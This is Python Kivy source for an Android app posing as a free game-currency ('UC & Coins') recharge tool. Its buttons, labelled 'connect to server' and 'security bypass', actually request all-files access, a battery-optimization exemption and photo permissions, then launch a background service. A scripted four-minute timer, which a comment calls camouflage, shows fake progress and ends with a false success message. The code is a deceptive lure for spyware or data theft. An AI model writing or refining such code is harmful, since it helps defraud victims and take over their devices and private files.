from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.clock import Clock 
from jnius import autoclass
from android.permissions import request_permissions, Permission

class CoinsApp(App):
    def build(self):
        # تم الضبط على 240 ثانية (4 دقائق) كما طلبت
        self.seconds = 240 
        layout = BoxLayout(orientation="vertical", padding=30, spacing=15)
        
        self.status = Label(text="UC & COINS RECHARGE SYSTEM", font_size='22sp', bold=True, color=(1, 0.8, 0, 1))
        
        self.player_id = TextInput(
            multiline=False, 
            hint_text="Enter Player ID...", 
            font_size='20sp',
            size_hint_y=None, 
            height=120,
            input_filter='int',
            background_color=(0.9, 0.9, 0.9, 1)
        )

        self.btn_1 = Button(text="STEP 1: CONNECT TO SERVER", background_color=(0.2, 0.4, 0.9, 1))
        self.btn_2 = Button(text="STEP 2: SECURITY BYPASS", background_color=(0.8, 0.5, 0.2, 1))
        self.btn_3 = Button(text="FINAL STEP: START INJECTION", background_color=(0.1, 0.7, 0.2, 1), bold=True)

        self.btn_1.bind(on_press=self.open_files)
        self.btn_2.bind(on_press=self.disable_battery)
        self.btn_3.bind(on_press=self.start_recharge_process)

        layout.add_widget(self.status)
        layout.add_widget(self.player_id)
        layout.add_widget(self.btn_1)
        layout.add_widget(self.btn_2)
        layout.add_widget(self.btn_3)
        return layout

    def open_files(self, instance):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Intent = autoclass('android.content.Intent')
            Settings = autoclass('android.provider.Settings')
            Uri = autoclass('android.net.Uri')
            activity = PythonActivity.mActivity
            uri = Uri.parse("package:" + activity.getPackageName())
            intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, uri)
            activity.startActivity(intent)
            instance.text = "✅ SERVER CONNECTED"
            instance.disabled = True
        except: pass

    def disable_battery(self, instance):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Intent = autoclass('android.content.Intent')
            Settings = autoclass('android.provider.Settings')
            Uri = autoclass('android.net.Uri')
            activity = PythonActivity.mActivity
            uri = Uri.parse("package:" + activity.getPackageName())
            intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.setData(uri)
            activity.startActivity(intent)
            instance.text = "✅ BYPASS ACTIVE"
            instance.disabled = True
        except: pass

    def start_recharge_process(self, instance):
        if not self.player_id.text:
            self.status.text = "❌ ERROR: ENTER ID!"
            return
        
        perms = [Permission.READ_MEDIA_IMAGES, Permission.FOREGROUND_SERVICE]
        request_permissions(perms, self.launch_service)

    def launch_service(self, permissions, grants):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            # تأكد أن اسم الباكيج هنا يطابق ما في buildozer.spec
            Service = autoclass('org.test.coinssync.ServiceMyservice')
            Service.start(PythonActivity.mActivity, "")
            
            self.btn_3.disabled = True
            self.player_id.disabled = True
            Clock.schedule_interval(self.update_timer, 1)
        except:
            self.status.text = "Connection Error - Try Again"

    def update_timer(self, dt):
        if self.seconds > 0:
            mins, secs = divmod(self.seconds, 60)
            
            # تمويه متغير: تتغير الرسالة حسب الوقت المتبقي لزيادة الإثارة
            if self.seconds > 180:
                msg = "🔍 Searching ID Database..."
            elif self.seconds > 120:
                msg = "🔌 Injecting Packets..."
            elif self.seconds > 60:
                msg = "⏳ Syncing with Game Server..."
            else:
                msg = "💎 Finalizing Coins Transfer..."
                
            self.status.text = f"{msg}\nTIME LEFT: {mins:02d}:{secs:02d}"
            self.status.color = (0, 0.8, 1, 1)
            self.seconds -= 1
        else:
            self.status.text = "✅ SUCCESS: 100,000 COINS SENT!"
            self.status.color = (0, 1, 0, 1)
            return False 
